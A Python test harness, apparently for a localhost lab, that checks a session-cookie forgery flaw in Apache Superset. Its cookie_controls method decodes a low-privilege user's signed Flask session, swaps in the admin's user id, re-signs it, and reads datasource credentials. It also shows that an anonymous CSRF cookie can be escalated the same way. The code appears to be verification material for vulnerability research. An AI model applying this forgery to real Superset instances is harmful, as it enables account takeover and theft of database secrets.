"""Real browser-cookie controls; callers must first qualify the target identity."""
import base64
from html.parser import HTMLParser
import http.cookiejar
import json
from pathlib import Path
import subprocess
import urllib.error
import urllib.parse
import urllib.request


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, request, file_pointer, code, message, headers, new_url):
        return None


class LoginForm(HTMLParser):
    def __init__(self):
        super().__init__()
        self.tokens = []

    def handle_starttag(self, tag, attrs):
        attributes = dict(attrs)
        if tag == 'input' and attributes.get('name') == 'csrf_token':
            self.tokens.append(attributes.get('value'))


class NativeHTTP:
    def __init__(self, compose, origin, artifacts):
        self.compose = compose
        self.origin = origin.rstrip('/')
        parsed = urllib.parse.urlsplit(self.origin)
        assert parsed.scheme == 'http' and parsed.hostname == '127.0.0.1' and parsed.port
        assert not parsed.path and not parsed.query and not parsed.fragment
        self.artifacts = Path(artifacts)
        self.commands = []
        self.requests = []

    def app(self, action, **options):
        source = Path(__file__).with_name('native_app.py').read_text()
        arguments = self.compose + ['exec', '-T', 'app', 'python', '-c', source,
                                    json.dumps(dict(action=action, **options))]
        row = {'argv': arguments}
        self.commands.append(row)
        result = subprocess.run(arguments, capture_output=True, text=True, timeout=60)
        row.update(stdout=result.stdout, stderr=result.stderr, exitstatus=result.returncode)
        assert result.returncode == 0, row
        lines = [line.removeprefix('MODULE-TARGET-SUPERSET-JSON:')
                 for line in result.stdout.splitlines() if line.startswith('MODULE-TARGET-SUPERSET-JSON:')]
        assert len(lines) == 1, row
        return json.loads(lines[0])

    @staticmethod
    def browser():
        jar = http.cookiejar.CookieJar()
        return urllib.request.build_opener(NoRedirect(), urllib.request.HTTPCookieProcessor(jar)), jar

    def request(self, browser, path, form=None, cookie=None):
        assert path.startswith('/') and not path.startswith('//')
        headers = {'Accept': 'application/json'}
        data = None
        if form is not None:
            data = urllib.parse.urlencode(form).encode()
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
        if cookie is not None:
            headers['Cookie'] = 'session=' + cookie
        request = urllib.request.Request(self.origin + path, data=data, headers=headers)
        row = {'url': request.full_url, 'method': request.get_method(), 'form': form, 'cookie': cookie}
        self.requests.append(row)
        try:
            try:
                response = browser.open(request, timeout=25)
            except urllib.error.HTTPError as error:
                response = error
            with response:
                body = response.read()
                row.update(status=response.code, headers=list(response.headers.items()),
                           body_base64=base64.b64encode(body).decode())
        except (urllib.error.URLError, TimeoutError, OSError) as error:
            row['transport_error'] = {'type': type(error).__name__, 'message': str(error)}
            raise
        return row['status'], body

    def login(self, username, password, accepted):
        browser, jar = self.browser()
        status, body = self.request(browser, '/login/')
        assert status == 200, self.requests[-1]
        form = LoginForm()
        form.feed(body.decode())
        assert len(form.tokens) == 1 and form.tokens[0], self.requests[-1]
        status, _ = self.request(browser, '/login/',
                                 form={'username': username, 'password': password, 'csrf_token': form.tokens[0]})
        # Flask-AppBuilder 4.1.3 redirects rejected passwords back to login.
        # Identity below independently distinguishes failure from success.
        assert status == 302, self.requests[-1]
        if not accepted:
            location = dict(self.requests[-1]['headers']).get('Location')
            assert urllib.parse.urlsplit(location).path == '/login/', self.requests[-1]
        identity_status, identity_body = self.request(browser, '/api/v1/me/')
        assert identity_status == (200 if accepted else 401), self.requests[-1]
        if not accepted:
            return None
        identity = json.loads(identity_body)['result']
        assert identity['username'] == username, identity
        cookies = [cookie.value for cookie in jar if cookie.name == 'session']
        assert len(cookies) == 1, 'Authenticated browser must expose one actual session cookie'
        return browser, identity, cookies[0]

    def cookie_controls(self):
        """Prove real identity escalation independently of the Framework signer."""
        baseline = self.app('state')
        users = {user['username']: user for user in baseline['users']}
        assert set(users) == {'lab-admin', 'lab-user'}, users
        assert users['lab-admin']['roles'] == ['Admin'] and users['lab-user']['roles'] == ['Gamma']
        anonymous, anonymous_jar = self.browser()
        assert self.request(anonymous, '/api/v1/me/')[0] == 401
        status, body = self.request(anonymous, '/unrelated/')
        assert status == 200 and b'version_string' not in body
        assert self.request(anonymous, '/unrelated/login')[0] == 404
        self.login('lab-user', 'module-target-incorrect-password', accepted=False)
        browser, identity, cookie = self.login('lab-user', 'module-target-superset-user-password', accepted=True)
        assert identity['id'] == users['lab-user']['id']
        assert len(baseline['databases']) == 1
        database_path = '/api/v1/database/' + str(baseline['databases'][0]['id'])
        # This release hides inaccessible datasource rows with 404. The same
        # row must return exact credentials to the administrator below.
        assert self.request(browser, database_path)[0] == 404, self.requests[-1]
        decoded = self.app('decode', cookie=cookie)['decoded']
        # Flask-Login changed this key across releases. Observe the actual
        # signed session instead of inheriting the owner's user_id assumption.
        identity_keys = [key for key in ['user_id', '_user_id'] if key in decoded]
        assert len(identity_keys) == 1, decoded
        key = identity_keys[0]
        assert str(decoded[key]) == str(users['lab-user']['id']), decoded
        decoded[key] = str(users['lab-admin']['id']) if isinstance(decoded[key], str) else users['lab-admin']['id']
        forged = self.app('sign', content=decoded)['cookie']
        fresh, _ = self.browser()
        status, body = self.request(fresh, '/api/v1/me/', cookie=forged)
        assert status == 200 and json.loads(body)['result']['username'] == 'lab-admin', self.requests[-1]
        missing_content = dict(decoded)
        assert 99999 not in [user['id'] for user in users.values()]
        missing_content[key] = 99999
        missing_cookie = self.app('sign', content=missing_content)['cookie']
        missing, _ = self.browser()
        assert self.request(missing, '/api/v1/me/', cookie=missing_cookie)[0] == 401
        status, body = self.request(fresh, database_path, cookie=forged)
        assert status == 200, self.requests[-1]
        datasource = json.loads(body)['result']
        assert datasource['parameters']['username'] == 'module_native', datasource
        assert datasource['parameters']['password'] == 'module-target-superset-database-password', datasource
        # A default signing key also permits escalation from an unauthenticated
        # CSRF cookie. Failed password authentication is therefore not evidence
        # that this vulnerability's credential-gathering path must fail.
        assert self.request(anonymous, '/login/')[0] == 200
        anonymous_cookies = [item.value for item in anonymous_jar if item.name == 'session']
        assert len(anonymous_cookies) == 1
        anonymous_content = self.app('decode', cookie=anonymous_cookies[0])['decoded']
        assert key not in anonymous_content
        anonymous_content[key] = decoded[key]
        anonymous_admin = self.app('sign', content=anonymous_content)['cookie']
        anonymous_forged, _ = self.browser()
        status, body = self.request(anonymous_forged, '/api/v1/me/', cookie=anonymous_admin)
        assert status == 200 and json.loads(body)['result']['username'] == 'lab-admin', self.requests[-1]
        invalid, _ = self.browser()
        assert self.request(invalid, '/api/v1/me/', cookie=forged + 'invalid')[0] == 401
        assert self.app('state') == baseline, 'Cookie controls changed account, datasource, dashboard or key-value state'
        return {'installed_serializer_used': True, 'actual_identity_key': key,
                'fresh_admin_identity': True, 'exact_datasource_secret': True, 'anonymous_cookie_escalation': True,
                'bad_password_and_signature_refused': True, 'logical_state_unchanged': True}

    def save(self):
        self.artifacts.mkdir(parents=True, exist_ok=True)
        (self.artifacts / 'native-http-observations.json').write_text(
            json.dumps({'commands': self.commands, 'requests': self.requests}, indent=2) + '\n')
